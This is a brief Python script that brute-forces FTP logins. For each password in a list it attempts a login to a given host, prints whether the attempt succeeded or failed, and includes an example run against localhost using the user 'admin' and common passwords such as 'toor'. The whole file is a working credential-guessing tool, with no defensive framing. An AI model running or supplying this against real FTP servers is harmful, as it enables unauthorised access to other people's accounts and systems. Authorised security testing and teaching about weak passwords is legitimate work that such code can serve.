import ftplib

def ftp_brute_force(host, username, password_list):
    for password in password_list:
        try:
            with ftplib.FTP(host) as ftp:
                ftp.login(user=username, passwd=password)
                print(f"[SUCCESS] Username: {username} | Password: {password}")
                return True
        except ftplib.error_perm:
            print(f"[FAILED] {username}:{password}")
    return False

# Example use
if __name__ == "__main__":
    host = "127.0.0.1"
    username = "admin"
    passwords = ["1234", "admin", "password", "toor"]
    ftp_brute_force(host, username, passwords)
